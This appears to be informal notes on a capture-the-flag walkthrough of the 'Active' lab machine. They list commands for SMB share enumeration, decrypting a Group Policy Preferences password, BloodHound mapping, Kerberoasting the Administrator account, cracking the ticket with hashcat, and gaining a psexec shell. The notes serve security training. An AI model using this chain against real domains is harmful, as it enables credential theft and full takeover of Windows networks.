Kerberoast - preauthentication is enabled and you can get hash for a user

Port 53 - DNS
Port 88 - Kerberos -> gives time -> make sure your box is within a minute? of the time
Port 389 - LDAP -> gives Domain (active.htb) -> adds to /etc/hosts
Port 445 - microsoft-ds -> SMB: You should see shares in a domain controller.

nslookup; 127.0.0.1;
dnsrecon -d 10.10.10.100 -r 10.0.0.0/8

locate -r '\.nse$' -> shows all map scripts
locate -r '\.nse$' | xargs grep categories
doing safe we get more smb scripts
nmap --script safe -p 445 10.10.10.100

smbclient -L //IP (anonymous authentication)
Because it's a domain controller we should see IPC$ and SYSVLO and stuff
smbmap -H IP
smbmap -R Replicaton -H IP (will list the contents of a directory) -> Very good
He looks at Groups.xml -> stored in a reversible format
smbmap -R Replication -H IP -A Groups.xml -q -> downloads file
updated; locate Groups.xml; (you can also log in with smbclient and do mget *)

He gets an encrypted password for user SVC_TGS.
gpp-decrypt HASH

GetADUsers.py -all active.htb/svc_tg -dc-ip IP -> gets all users in AD
We can attempt psexec.py active.htb/svc_tgs@IP -> if we are admin user we might run

smbmap -d active.htb -u svc_tgs -p PASSWORD -H IP (see our access to shares with a user)

Gets user creds.
Runs bloodhound in Windows:
runas /netonly /user:USER cmd (creates a session but doesn't validate that the user exists or not, Windows tries to do its SSO magic passing NTLM hashes)
runas /netonly /user:active.htb\svc_tgs cmd
Then he does dir \\10.10.10.100\Users - he got access

powershell; .\SharpHound -c all -d active.htb --domaincontroller 10.10.10.100 (did not work)
Test-NetConnection -ComputerName 10.10.10.100 -Port 389
He changes the DNS server in Windows (he didn't see any traffic) to 10.10.10.100
Now it works
Start neo4j; start BloodHound; Import zip file
First thing he does is look a path from SVC_TGS to DOMAIN ADMINS
User Administrator is Kerberoastable

GetUsersSPNs.py -request -dc-ip IP active.htb/svc_tgs
He gets the ticket for Administrator
hashcat -m 13100 file rockyou.txt
Gets password
psexec.py active.htb/Administrator@IP
